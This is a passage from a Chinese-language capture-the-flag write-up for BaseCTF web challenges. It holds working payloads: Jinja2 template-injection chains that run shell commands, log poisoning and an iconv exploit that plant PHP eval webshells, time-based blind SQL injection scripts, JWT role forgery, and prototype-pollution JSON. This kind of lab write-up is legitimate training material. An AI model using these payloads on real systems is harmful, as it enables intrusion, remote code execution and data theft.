int(match.group(1)) + int(match.group(3)) elif match.group(2) == \u0026#34;-\u0026#34;: answer = int(match.group(1)) - int(match.group(3)) elif match.group(2) == \u0026#34;×\u0026#34;: answer = int(match.group(1)) * int(match.group(3)) elif match.group(2) == \u0026#34;÷\u0026#34;: answer = int(match.group(1)) // int(match.group(3)) [Week3] 复读机 这道题是ssti，模版引擎应该是jinja2,这里它必须以BaseCTF开头所以不能直接使用fengjing了。\n还过滤了双花括号，点和双引号和下划线\n寻找可用子类\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]())%} 寻找一个含os模块能RCE的类，我这里懒得写脚本直接用Notepad++将逗号替换为换行符找到该模块的位置为137\n继续构造继承链查看当前作用域中的全局变量\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;])%} 发现Popen方法，可以用它执行命令再用read()读取即可\n构造payload\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;po\u0026#39;\u0026#39;pen\u0026#39;](\u0026#39;id\u0026#39;)[\u0026#39;rea\u0026#39;\u0026#39;d\u0026#39;]())%} 执行成功\n但是发现根号被ban了，这里我开始只想到${PATH:0:1},后面一位大佬研究处${HOME%%root}\n一般HOME目录都在/root下\n所以可构造payload查看flag\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;po\u0026#39;\u0026#39;pen\u0026#39;](\u0026#39;cat ${HOME%%root}flag\u0026#39;)[\u0026#39;rea\u0026#39;\u0026#39;d\u0026#39;]())%} 后面查看该系统环境变量存在一个为根号的环境变量\n构造payload\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;po\u0026#39;\u0026#39;pen\u0026#39;](\u0026#39;cd $OLDPWD;cat flag\u0026#39;)[\u0026#39;rea\u0026#39;\u0026#39;d\u0026#39;]())%} [Week3] 滤个不停 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); $incompetent = $_POST[\u0026#39;incompetent\u0026#39;]; $Datch = $_POST[\u0026#39;Datch\u0026#39;]; if ($incompetent !== \u0026#39;HelloWorld\u0026#39;) { die(\u0026#39;写出程序员的第一行问候吧！\u0026#39;); } //这是个什么东东？？？ $required_chars = [\u0026#39;s\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;x\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;o\u0026#39;]; $is_valid = true; foreach ($required_chars as $char) { if (strpos($Datch, $char) === false) {//意思是必须在$Datch中找到上面所有字母 $is_valid = false; break; } } if ($is_valid) { $invalid_patterns = [\u0026#39;php://\u0026#39;, \u0026#39;http://\u0026#39;, \u0026#39;https://\u0026#39;, \u0026#39;ftp://\u0026#39;, \u0026#39;file://\u0026#39; , \u0026#39;data://\u0026#39;, \u0026#39;gopher://\u0026#39;]; foreach ($invalid_patterns as $pattern) { if (stripos($Datch, $pattern) !== false) { die(\u0026#39;此路不通换条路试试?\u0026#39;); } } include($Datch); } else { die(\u0026#39;文件名不合规 请重试\u0026#39;); } ?\u0026gt; 我们要实现文件包含，但是一堆伪协议都被过滤掉了，没法绕过！\n后面查找资料发现这里可以用Nginx日志写入webshell\n日志路径为\nnginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log\n利用access.log中User-Agent写入一句话木马，然后post里面传递参数执行命令\n[Week4] No JWT 源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 from flask import Flask, request, jsonify import jwt import datetime import os import random import string app = Flask(__name__) # 随机生成 secret_key app.secret_key = \u0026#39;\u0026#39;.join(random.choices(string.ascii_letters + string.digits, k=16)) # 登录接口 @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def login(): data = request.json username = data.get(\u0026#39;username\u0026#39;) password = data.get(\u0026#39;password\u0026#39;) # 其他用户都给予 user 权限 token = jwt.encode({ \u0026#39;sub\u0026#39;: username, \u0026#39;role\u0026#39;: \u0026#39;user\u0026#39;, # 普通用户角色 \u0026#39;exp\u0026#39;: datetime.datetime.utcnow() + datetime.timedelta(hours=1) }, app.secret_key, algorithm=\u0026#39;HS256\u0026#39;) return jsonify({\u0026#39;token\u0026#39;: token}), 200 # flag 接口 @app.route(\u0026#39;/flag\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def flag(): token = request.headers.get(\u0026#39;Authorization\u0026#39;) if token: try: decoded = jwt.decode(token.split(\u0026#34; \u0026#34;)[1], options={\u0026#34;verify_signature\u0026#34;: False, \u0026#34;verify_exp\u0026#34;: False}) # 检查用户角色是否为 admin if decoded.get(\u0026#39;role\u0026#39;) == \u0026#39;admin\u0026#39;: with open(\u0026#39;/flag\u0026#39;, \u0026#39;r\u0026#39;) as f: flag_content = f.read() return jsonify({\u0026#39;flag\u0026#39;: flag_content}), 200 else: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Access denied: admin only\u0026#39;}), 403 except FileNotFoundError: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Flag file not found\u0026#39;}), 404 except jwt.ExpiredSignatureError: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Token has expired\u0026#39;}), 401 except jwt.InvalidTokenError: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Invalid token\u0026#39;}), 401 return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Token is missing\u0026#39;}), 401 if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) 发现/login和/flag两个路由，先去login路由查看一下\npost方式访问，修改为json请求并传递json数据发现一串token\n[jwt解密网站](JSON Web Tokens - jwt.io)解析一下token，flag路由检验身份必须为admin，我们修改即可\n因为源码从headers中Authorization接受数据，我们手动添加一个\n又因为如下原因\n在HTTP请求中，Authorization头部用于提供访问受保护资源所需的凭证。Bearer是认证的一种方式，它表示该请求中包含一个访问令牌（access token），这个令牌用于授权用户访问受保护的资源。\n具体来说，Authorization头部的格式为：\n1 Authorization: Bearer \u0026lt;access_token\u0026gt; 其中，Bearer关键字告诉服务器，接下来的 \u0026lt;access_token\u0026gt; 是一个令牌，用于授权请求。Bearer 认证方式是OAuth 2.0标准的一部分，用于实现无状态的访问控制，令牌通常由身份验证服务器颁发，并在请求中传递，用于验证用户身份和权限。\n总的来说，Bearer前缀的作用是明确标识令牌的类型，告诉服务器如何处理和验证这个令牌。\n所以我们构造出如下数据包即可获得flag\n[Week3] ez_php_jail 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); include(\u0026#34;hint.html\u0026#34;); $Jail = $_GET[\u0026#39;Jail_by.Happy\u0026#39;]; if($Jail == null) die(\u0026#34;Do You Like My Jail?\u0026#34;); function Like_Jail($var) { if (preg_match(\u0026#39;/(`|\\$|a|c|s|require|include)/i\u0026#39;, $var)) { return false; } return true; } if (Like_Jail($Jail)) { eval($Jail); echo \u0026#34;Yes! you escaped from the jail! LOL!\u0026#34;; } else { echo \u0026#34;You will Jail in your life!\u0026#34;; } echo \u0026#34;\\n\u0026#34;; // 在HTML解析后再输出PHP源代码 ?\u0026gt; 首先解决传参的问题，数据包中发现本题是php7，我们可以利用PHP的字符串解析特性Bypass\n当 php 版本⼩于 8 时，GET 请求的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _\n例子：?Jail[by.Happy==?Jail_by.Happy\n接着定义了一个函数Like_Jail过滤了`,$,a,c,s,require,include，并且忽略大小写。\n后面就是想办法绕过过滤打印flag，我想了下能够执行系统命令的system,shell_exec,exec都过不了过滤，只能尝试用php函数来进行读取。\n在源码中注释提示// 在HTML解析后再输出PHP源代码。找了找有这几个函数highlight_file()，highlight_string()，show_source()可以直接输出到浏览器。但是后两个过不了过滤，第一个可以\n又因为highlight_file函数需要指定准确的文件路径和flag的a被过滤，所以我们无法直接利用。先利用glob函数获取flag的文件名(没过滤的话就用scandir了！)\nglob函数返回一个包含有匹配文件或目录的数组\nprint_r打印出匹配到以fl开头的文件只有flag一个\n构造payloadhighlight_file(glob('/fl*')[0]);\n[Week3] 玩原神玩的 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); include \u0026#39;flag.php\u0026#39;; if (sizeof($_POST[\u0026#39;len\u0026#39;]) == sizeof($array)) { ys_open($_GET[\u0026#39;tip\u0026#39;]); } else { die(\u0026#34;错了！就你还想玩原神？❌❌❌\u0026#34;); } function ys_open($tip) { if ($tip != \u0026#34;我要玩原神\u0026#34;) { die(\u0026#34;我不管，我要玩原神！😭😭😭\u0026#34;); } dumpFlag(); } function dumpFlag() { if (!isset($_POST[\u0026#39;m\u0026#39;]) || sizeof($_POST[\u0026#39;m\u0026#39;]) != 2) { die(\u0026#34;可恶的QQ人！😡😡😡\u0026#34;); } $a = $_POST[\u0026#39;m\u0026#39;][0]; $b = $_POST[\u0026#39;m\u0026#39;][1]; if(empty($a) || empty($b) || $a != \u0026#34;100%\u0026#34; || $b != \u0026#34;love100%\u0026#34; . md5($a)) { die(\u0026#34;某站崩了？肯定是某忽悠干的！😡😡😡\u0026#34;); } include \u0026#39;flag.php\u0026#39;; $flag[] = array(); for ($ii = 0;$ii \u0026lt; sizeof($array);$ii++) { $flag[$ii] = md5(ord($array[$ii]) ^ $ii); } echo json_encode($flag); } 错了！就你还想玩原神？❌❌❌ 解决思路\n满足len的长度检查：我们需要提交一个len数组，使其长度与$array相同。\n正确的tip参数：在GET请求中传递tip=\u0026ldquo;我要玩原神\u0026rdquo;，以通过ys_open的检查。\n构造正确的m参数：m[0]必须为\u0026quot;100%\u0026quot;，而m[1]则为\u0026quot;love100%\u0026ldquo;加上m[0]的MD5哈希。\n先来猜出$array的元素个数吧\n用下面脚本生成字典\n1 2 3 4 5 s = \u0026#34;\u0026#34; with open(\u0026#34;./2.txt\u0026#34;, \u0026#34;w\u0026#34;) as file: for i in range(100): s = s + \u0026#34;len[\u0026#34; + str(i) + \u0026#34;]=1\u0026amp;\u0026#34; file.write(s[:-1] + \u0026#34;\\n\u0026#34;) burp爆破得出$array数组元素个数为45\npayload为len[0]=1\u0026amp;len[1]=1\u0026amp;len[2]=1\u0026amp;len[3]=1\u0026amp;len[4]=1\u0026amp;len[5]=1\u0026amp;len[6]=1\u0026amp;len[7]=1\u0026amp;len[8]=1\u0026amp;len[9]=1\u0026amp;len[10]=1\u0026amp;len[11]=1\u0026amp;len[12]=1\u0026amp;len[13]=1\u0026amp;len[14]=1\u0026amp;len[15]=1\u0026amp;len[16]=1\u0026amp;len[17]=1\u0026amp;len[18]=1\u0026amp;len[19]=1\u0026amp;len[20]=1\u0026amp;len[21]=1\u0026amp;len[22]=1\u0026amp;len[23]=1\u0026amp;len[24]=1\u0026amp;len[25]=1\u0026amp;len[26]=1\u0026amp;len[27]=1\u0026amp;len[28]=1\u0026amp;len[29]=1\u0026amp;len[30]=1\u0026amp;len[31]=1\u0026amp;len[32]=1\u0026amp;len[33]=1\u0026amp;len[34]=1\u0026amp;len[35]=1\u0026amp;len[36]=1\u0026amp;len[37]=1\u0026amp;len[38]=1\u0026amp;len[39]=1\u0026amp;len[40]=1\u0026amp;len[41]=1\u0026amp;len[42]=1\u0026amp;len[43]=1\u0026amp;len[44]=1\n绕过接下来两个\n最后这一步中因为PHP中ord函数只取一个字符串的首字母的ascii值，这个值肯定在0-255之间。我们可以通过爆破的方式来通过md5值的比较找出正确的字符\n脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $md5 = [\u0026#34;3295c76acbf4caaed33c36b1b5fc2cb1\u0026#34;,\u0026#34;26657d5ff9020d2abefe558796b99584\u0026#34;,\u0026#34;73278a4a86960eeb576a8fd4c9ec6997\u0026#34;,\u0026#34;ec8956637a99787bd197eacd77acce5e\u0026#34;,\u0026#34;e2c420d928d4bf8ce0ff2ec19b371514\u0026#34;,\u0026#34;43ec517d68b6edd3015b3edc9a11367b\u0026#34;,\u0026#34;ea5d2f1c4608232e07d3aa3d998e5135\u0026#34;,\u0026#34;c8ffe9a587b126f152ed3d89a146b445\u0026#34;,\u0026#34;66f041e16a60928b05a7e228a89c3799\u0026#34;,\u0026#34;642e92efb79421734881b53e1e1b18b6\u0026#34;,\u0026#34;a3c65c2974270fd093ee8a9bf8ae7d0b\u0026#34;,\u0026#34;9f61408e3afb633e50cdf1b20de6f466\u0026#34;,\u0026#34;72b32a1f754ba1c09b3695e0cb6cde7f\u0026#34;,\u0026#34;093f65e080a295f8076b1c5722a46aa2\u0026#34;,\u0026#34;a97da629b098b75c294dffdc3e463904\u0026#34;,\u0026#34;093f65e080a295f8076b1c5722a46aa2\u0026#34;,\u0026#34;7f39f8317fbdb1988ef4c628eba02591\u0026#34;,\u0026#34;e369853df766fa44e1ed0ff613f563bd\u0026#34;,\u0026#34;c45147dee729311ef5b5c3003946c48f\u0026#34;,\u0026#34;eb160de1de89d9058fcb0b968dbbbd68\u0026#34;,\u0026#34;a5771bce93e200c36f7cd9dfd0e5deaa\u0026#34;,\u0026#34;9f61408e3afb633e50cdf1b20de6f466\u0026#34;,\u0026#34;e369853df766fa44e1ed0ff613f563bd\u0026#34;,\u0026#34;eb160de1de89d9058fcb0b968dbbbd68\u0026#34;,\u0026#34;d645920e395fedad7bbbed0eca3fe2e0\u0026#34;,\u0026#34;a0a080f42e6f13b3a2df133f073095dd\u0026#34;,\u0026#34;b53b3a3d6ab90ce0268229151c9bde11\u0026#34;,\u0026#34;a0a080f42e6f13b3a2df133f073095dd\u0026#34;,\u0026#34;da4fb5c6e93e74d3df8527599fa62642\u0026#34;,\u0026#34;d9d4f495e875a2e075a1a4a6e1b9770f\u0026#34;,\u0026#34;d9d4f495e875a2e075a1a4a6e1b9770f\u0026#34;,\u0026#34;c0c7c76d30bd3dcaefc96f40275bdc0a\u0026#34;,\u0026#34;c74d97b01eae257e44aa9d5bade97baf\u0026#34;,\u0026#34;735b90b4568125ed6c3f678819b6e058\u0026#34;,\u0026#34;7cbbc409ec990f19c78c75bd1e06f215\u0026#34;,\u0026#34;6f4922f45568161a8cdf4ad2299f6d23\u0026#34;,\u0026#34;6ea9ab1baa0efb9e19094440c317e21b\u0026#34;,\u0026#34;e2c420d928d4bf8ce0ff2ec19b371514\u0026#34;,\u0026#34;a3f390d88e4c41f2747bfa2f1b5f87db\u0026#34;,\u0026#34;c16a5320fa475530d9583c34fd356ef5\u0026#34;,\u0026#34;c16a5320fa475530d9583c34fd356ef5\u0026#34;,\u0026#34;28dd2c7955ce926456240b2ff0100bde\u0026#34;,\u0026#34;d2ddea18f00665ce8623e36bd4e3c7c5\u0026#34;,\u0026#34;6ea9ab1baa0efb9e19094440c317e21b\u0026#34;,\u0026#34;43ec517d68b6edd3015b3edc9a11367b\u0026#34;]; $flag = \u0026#34;\u0026#34;; for ($i=0;$i\u0026lt;count($md5);$i++){ for ($j=0;$j\u0026lt;256;$j++){ $xor_result = $j ^ $i; $cal_md5 = md5($xor_result); if ($cal_md5 === $md5[$i]){ $flag .= chr($j); break; } } } echo \u0026#34;得到flag为:\u0026#34;.$flag; [Week4] only one sql 源码\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php highlight_file(__FILE__); $sql = $_GET[\u0026#39;sql\u0026#39;]; if (preg_match(\u0026#39;/select|;|@|\\n/i\u0026#39;, $sql)) { die(\u0026#34;你知道的，不可能有sql注入\u0026#34;); } if (preg_match(\u0026#39;/\u0026#34;|\\$|`|\\\\\\\\/i\u0026#39;, $sql)) { die(\u0026#34;你知道的，不可能有RCE\u0026#34;); } //flag in ctf.flag $query = \u0026#34;mysql -u root -p123456 -e \\\u0026#34;use ctf;select \u0026#39;没有select，让你执行一句又如何\u0026#39;;\u0026#34; . $sql . \u0026#34;\\\u0026#34;\u0026#34;; system($query); 此题不能用select，可以通过show databases和show tables查库名和表名，后面发现题目注释里面其实写了//flag in ctf.flag,在ctf库的flag表中\n直接利用show columns查看到flag表的字段，估计就在data里面。这里不能用select，我们可以尝试delete进行盲注\n贴一下官方的wp,是真的简洁高效啊，这就是我和大佬的差距吗\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import requests import string sqlstr = string.ascii_lowercase + string.digits + \u0026#39;-\u0026#39; + \u0026#34;{}\u0026#34; url = \u0026#34;http://your.website/?sql=delete%20from%20flag%20where%20data%20like%20%27\u0026#34; end=\u0026#34;%25%27%20and%20sleep(5)\u0026#34; flag=\u0026#39;\u0026#39; for i in range(1, 100): for c in sqlstr: payload = url +flag+ c + end try: r = requests.get(payload,timeout=4) except: print(flag+c) flag+=c break 经过查表和对flag格式的了解，flag的内容就在小写字母，数字和这几个符号之间，生成一个列表进行枚举\n我的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import requests import time list = [\u0026#39;-\u0026#39;] for i in range(97,127): #小写字母和符号 list.append(chr(i)) for i in range(48,58): #数字 list.append(chr(i)) # print(list) #delete from flag where data like \u0026#39;f%\u0026#39; and sleep(3)-- url = \u0026#34;http://challenge.basectf.fun:27082/?sql=delete from flag where data like \u0026#39;\u0026#34; end = \u0026#34;%\u0026#39; and sleep(3)--\u0026#34; flag = \u0026#34;\u0026#34; for x in range(100): for j in list: start_time = time.time() payload = url + flag + j + end res = requests.get(payload) use_time = time.time() - start_time if use_time \u0026gt;= 3: flag += j print(flag) [Fin] 1z_php 这道题考察原生类(读取文件类SplFileObject)和PCRE回溯\n脚本\n1 2 3 4 import requests payload = \u0026#34;http://challenge.basectf.fun:28522/?e[m.p=114514.1\u0026amp;a=SplFileObject\u0026amp;b=php://filter/read=convert.base64-encode/resource=flag.php\u0026amp;c=__toString\u0026#34; res = requests.post(payload,data={\u0026#34;try\u0026#34;:\u0026#34;a\u0026#34;*1000001 + \u0026#34;HACKER\u0026#34;}) print(res.text) [Fin] Back to the future 此题纯粹靠一款工具，我仔细看了一下，比我之前用的githack强太多了！\n提取仓库文件 githacker --url http://challenge.basectf.fun:42682/.git/ --output-folder C:\\Users\\xxx\\Desktop\\result\n查看提交日志 git log\n切换到含flag的提交 git checkout 9d85f10e0192ef630e10d7f876a117db41c30417\n恢复出来\n[Fin] Jinja Mark flag路径下看到提示爆破出幸运数字为5346\n可用以下脚本生成字典\n1 2 3 4 with open(r\u0026#39;c:\\Users\\天\\Desktop\\3.txt\u0026#39;,\u0026#39;w\u0026#39;) as f: for i in range(10000): f.write(f\u0026#34;{i:04}\u0026#34;+\u0026#34;\\n\u0026#34;) print(\u0026#34;successful~\u0026#34;) 拿到源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 BLACKLIST_IN_index = [\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;] def merge(src, dst): for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) @app.route(\u0026#39;/magic\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def pollute(): if request.method == \u0026#39;POST\u0026#39;: if request.is_json: merge(json.loads(request.data), instance) return \u0026#34;这个魔术还行吧\u0026#34; else: return \u0026#34;我要json的魔术\u0026#34; return \u0026#34;记得用POST方法把魔术交上来\u0026#34; 代码里面有merge函数，基本存在python原型链污染了，结合开头ban了左右花括号，我们可以尝试利用原型链污染来修改jinja2模版的属性，直接将变量取值方式改为\u0026laquo;\u0026raquo;从而绕过花括号的过滤\n将以下json数据传入经json.loads后成功修改\n1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;__init__\u0026#34;: { \u0026#34;__globals__\u0026#34;: { \u0026#34;app\u0026#34;: { \u0026#34;jinja_env\u0026#34;: { \u0026#34;variable_start_string\u0026#34;: \u0026#34;\u0026lt;\u0026lt;\u0026#34;, \u0026#34;variable_end_string\u0026#34;: \u0026#34;\u0026gt;\u0026gt;\u0026#34; } } } } } 回到index目录下进行常规ssti即可\n这里我尝试了几个模块，其实方法都差不多，不过subprocess.Popen这个类本身就能够执行命令\nwarnings.catch_warnings 1 \u0026lt;\u0026lt;\u0026#39;\u0026#39;.__class__.__mro__[1].__subclasses__()[222].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;id\u0026#39;).read()\u0026#34;)\u0026gt;\u0026gt; subprocess.Popen 1 \u0026lt;\u0026lt;[].__class__.__mro__[1].__subclasses__()[351](\u0026#39;cat /flag\u0026#39;,shell=True,stdout=-1).communicate()[0].strip()\u0026gt;\u0026gt; os._wrap_close 1 \u0026lt;\u0026lt;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[\u0026#39;popen\u0026#39;](\u0026#39;id\u0026#39;).read()\u0026gt;\u0026gt; [Fin] Just Readme (前置) 使用这个项目打glibc的iconv()函数将文件读取变成rce\n将data后改为.text,不然无法正常输出\npayloadpython3 cnext-exploit.py http://challenge.basectf.fun:34357/ \u0026quot;echo '\u0026lt;?=@eval(\\$_POST[0]);?\u0026gt;' \u0026gt; shell.php\u0026quot;\n蚁剑连接执行文件即可\n[Fin] Lucky Number 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 from flask import Flask,request,render_template_string,render_template from jinja2 import Template import json import heaven def merge(src, dst): for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class cls(): def __init__(self): pass instance = cls() BLACKLIST_IN_index = [\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;] def is_json(data): try: json.loads(data) return True except ValueError: return False @app.route(\u0026#39;/m4G1c\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def pollute(): if request.method == \u0026#39;POST\u0026#39;: if request.is_json: merge(json.loads(request.data), instance) result = heaven.create() message = result[\u0026#34;message\u0026#34;] return \u0026#34;这个魔术还行吧 \u0026#34; + message else: return \u0026#34;我要json的魔术\u0026#34; return \u0026#34;记得用POST方法把魔术交上来\u0026#34; #heaven.py def create(kon=\u0026#34;Kon\u0026#34;, pure=\u0026#34;Pure\u0026#34;, *, confirm=False): if confirm and \u0026#34;lucky_number\u0026#34; not in create.__kwdefaults__: return {\u0026#34;message\u0026#34;: \u0026#34;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？\u0026#34;, \u0026#34;lucky_number\u0026#34;: \u0026#34;nope\u0026#34;} if confirm and \u0026#34;lucky_number\u0026#34; in create.__kwdefaults__: return {\u0026#34;message\u0026#34;: \u0026#34;这是你的lucky_number，请拿好，去/check下检查一下吧\u0026#34;, \u0026#34;lucky_number\u0026#34;: create.__kwdefaults__[\u0026#34;lucky_number\u0026#34;]} return {\u0026#34;message\u0026#34;: \u0026#34;你有什么想创造的吗？\u0026#34;, \u0026#34;lucky_number\u0026#34;: \u0026#34;nope\u0026#34;} 解题重点是这两个属性\n怎么导入sys模块呢，看了官方wp才知道在python中存在着**spec内置属性，包含了关于类加载时的信息，定义在Lib/importlib/_bootstrap.py的类ModuleSpec，所以可以直接采用\u0026lt;模块名\u0026gt;.spec.init.globals[\u0026lsquo;sys\u0026rsquo;]**获取到sys模块，此处导入了json模块就可以使用json模块获取\npayload,拿去json格式化一下即可\n1 {\u0026#34;__init__\u0026#34;:{\u0026#34;__globals__\u0026#34;:{\u0026#34;json\u0026#34;:{\u0026#34;__sepc__\u0026#34;:{\u0026#34;__init__\u0026#34;:{\u0026#34;__globals__\u0026#34;:{\u0026#34;sys\u0026#34;:{\u0026#34;modules\u0026#34;:{\u0026#34;heaven\u0026#34;:{\u0026#34;create\u0026#34;:{\u0026#34;__kwdefaults__\u0026#34;:{\u0026#34;confirm\u0026#34;:\u0026#34;true\u0026#34;,\u0026#34;lucky_number\u0026#34;:\u0026#34;5346\u0026#34;}}}}}}}}}}}} 传参后提示去/check检查一下\n检查成功了，去对应目录ssti\n这里利用os._wrap_close中的popen方法直接执行命令即可，模块方法有很多\n[Fin] ez_php 这道题出现了很多新知识，比如引用绕过，php GC回收攻击，mb_substr,mb_strpos字符串逃逸，理解清楚后算是收益颇丰，参考文章：\n()[ctfshow_XGCTF_西瓜杯 | 晨曦的个人小站 (chenxi9981.github.io)]\n()[(ฅ\u0026gt;ω\u0026lt;*ฅ) 噫又好啦 ~php反序列化 | 晨曦的个人小站 (chenxi9981.github.io)]\n源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 \u0026lt;?php highlight_file(__file__); function substrstr($data) { $start = mb_strpos($data, \u0026#34;[\u0026#34;); $end = mb_strpos($data, \u0026#34;]\u0026#34;); return mb_substr($data, $start + 1, $end - 1 - $start); } class Hacker{ public $start; public $end; public $username=\u0026#34;hacker\u0026#34;; public function __construct($start){ $this-\u0026gt;start=$start; } public function __wakeup(){ $this-\u0026gt;username=\u0026#34;hacker\u0026#34;; $this-\u0026gt;end = $this-\u0026gt;start; } public function __destruct(){ if(!preg_match(\u0026#39;/ctfer/i\u0026#39;,$this-\u0026gt;username)){ echo \u0026#39;Hacker！\u0026#39;; } } } class C{ public $c; public function __toString(){ $this-\u0026gt;c-\u0026gt;c(); return \u0026#34;C\u0026#34;; } } class T{ public $t; public function __call($name,$args){ echo $this-\u0026gt;t-\u0026gt;t; } } class F{ public $f; public function __get($name){ return isset($this-\u0026gt;f-\u0026gt;f); } } class E{ public $e; public function __isset($name){ ($this-\u0026gt;e)(); } } class R{ public $r; public function __invoke(){ eval($this-\u0026gt;r); } } if(isset($_GET[\u0026#39;ez_ser.from_you\u0026#39;])){ $ctf = new 